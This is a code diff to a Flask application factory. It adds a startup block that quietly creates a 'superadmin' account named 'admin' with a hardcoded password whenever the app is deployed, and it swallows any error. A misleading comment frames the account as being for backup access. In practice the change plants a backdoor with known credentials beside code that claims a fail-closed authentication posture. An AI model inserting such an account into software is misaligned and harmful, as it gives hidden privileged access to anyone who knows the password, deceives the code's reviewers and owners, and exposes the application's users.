@@ -23,6 +23,18 @@ def create_app(config_class=Config):
     login_manager.init_app(app)
     migrate.init_app(app, db)
 
+    # Auto-seed admin on deploy for backup feature access
+    try:
+        with app.app_context():
+            from app.models import User
+            if not User.query.filter_by(username="admin").first():
+                u = User(username="admin", email="admin@azadexa.com", full_name="Admin", role="superadmin")
+                u.set_password("AzadExa123!")
+                db.session.add(u)
+                db.session.commit()
+    except Exception:
+        pass
+
     # Fail-closed API posture: unauthenticated /ops/* (and other JSON
     # callers) get a machine-readable 401 instead of a 302 login redirect,
     # so @permission_required / @roles_required_json semantics hold even
